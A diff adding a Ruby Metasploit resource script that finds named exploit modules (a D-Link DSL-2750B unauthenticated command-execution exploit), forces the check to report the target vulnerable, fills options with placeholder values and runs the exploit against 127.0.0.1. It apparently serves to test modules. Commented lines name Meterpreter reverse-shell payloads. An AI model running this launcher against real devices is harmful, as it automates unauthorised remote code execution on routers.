@@ -1,0 +1,160 @@
+<ruby>
+
+require 'pp'
+require 'nokogiri'
+
+# Launch few set of metasploit modules against a target.
+# Copy this to resources folder.
+# msf5 > resource launchmetasploitmodules.rc
+
+def getmodule(rrefname)
+	print_line("rrefname       : " + rrefname)
+	framework.exploits.sort.each { |refname, mod|
+		# print_line("RefName       : " + refname)
+			
+		if refname != rrefname
+			next
+		end
+			
+		o = nil
+		begin
+			o = mod.new
+		rescue ::Exception
+		end
+		return o
+	}
+	
+	return nil
+end
+
+$modrefname= nil
+$rhostip   = "127.0.0.1"
+$rhostport = "80"
+
+
+$modulestotry = [
+"linux/http/dlink_dsl2750b_exec_noauth"
+]
+
+$modulestotry.each do |modname|
+	$modrefname= modname
+
+	o= getmodule($modrefname)
+	
+	# o = framework.exploits.create('linux/http/netgear_dgn1000_setup_unauth_exec')
+	# o = framework.exploits.create($modrefname)
+
+	if o != nil
+		print_line("Got the module")
+	else
+		print_line("Didn't get the module")
+		print_line($modrefname)
+		return
+	end
+	
+	def o.check
+		print "calling checked"
+	  return Exploit::CheckCode::Detected
+	end
+
+	self.run_single("use exploits/#{$modrefname}")
+	self.run_single("set LHOST 127.0.0.1")
+	self.run_single("set RHOST #{$rhostip}")
+	self.run_single("set RPORT #{$rhostport}")
+	self.run_single("set SSL false")
+	# self.run_single("set HttpTrace true")
+	
+	if o.datastore['USERNAME'] == nil or o.datastore['USERNAME'] == ""
+		self.run_single("set USERNAME \"myusername\"")
+	end
+	
+	if o.datastore['PASSWORD'] == nil or o.datastore['PASSWORD'] == ""
+		self.run_single("set PASSWORD \"mypassword\"")
+	end
+	
+	# o.datastore['LHOST'] = "127.0.0.1"
+	# o.datastore['RHOST'] = $rhostip
+	# o.datastore['RPORT'] = $rhostport
+	# o.datastore['SSL'] = false
+	# # o.datastore['PAYLOAD'] = 'linux/mipsbe/meterpreter/reverse_tcp'
+	
+	# PP.pp(o.methods())
+	PP.pp(o.datastore)
+	
+	# o.datastore.each do |opton|
+		# print opton.type
+		# if opton.required
+			# print "Option is required."
+		# else
+			# print "Option is not required."
+		# end
+	# end
+	
+	exclusionlist= Set.new(["LHOST", "RHOST", "RPORT", "SSL", "USERNAME", "PASSWORD"])
+	
+	o.options.sorted.each do |entry|
+         name, opt = entry
+		 next
+		 
+		 if exclusionlist.include? name
+			next
+		 end
+		 
+		 val = o.datastore[name] || opt.default
+		 if opt.required?
+			#print o.datastore[name]
+			print "Option is required. %s \n" % [name]
+			if opt.default
+				print "Default value \"%s\"\n" % [opt.default]
+				
+				if opt.default == ""
+					self.run_single("set #{name} testingvalue")
+				end
+				
+			else
+				if val == nil
+					print "No default value - nil\n"
+					print "set #{name} testingvalue\n"
+					self.run_single("set #{name} testingvalue")
+					print "successfully set #{name} testingvalue\n"
+				else
+					if val != ""
+						print "No default value\n"
+						if not (val.is_a?(FalseClass) or val.is_a?(TrueClass))
+							print val
+							self.run_single("set #{name} testingvalue")
+						end
+						
+					end
+				end
+			end
+		 else
+			print "Option is optional. %s \n" % [name]
+		 end
+	end
+	
+	if o.options['Payload'] == nil
+		print "payload is null"
+		# self.run_single("set Payload 'cmd/unix/generic'")
+		# self.run_single("set Payload 'osx/ppc/shell/reverse_tcp'")
+		# self.run_single("set CMD 'testingcmd'")
+		# return
+	else
+		print o.options['Payload']
+	end
+		o.targets.each_index do |i|
+		print o.targets[i].name
+		PP.pp(o.targets[i])
+	end
+
+	self.run_single('run')
+	# o.run_simple({ 'RunAsJob' => true, 'LocalOutput' => self.output })
+	# o.run_simple()
+	# o.exploit_simple()
+	# o.exploit()
+	# o.exploit_simple({'LocalOutput' => self.output, 'RunAsJob' => false, 'Payload' => o.datastore['PAYLOAD']})
+	
+end
+
+</ruby>
+
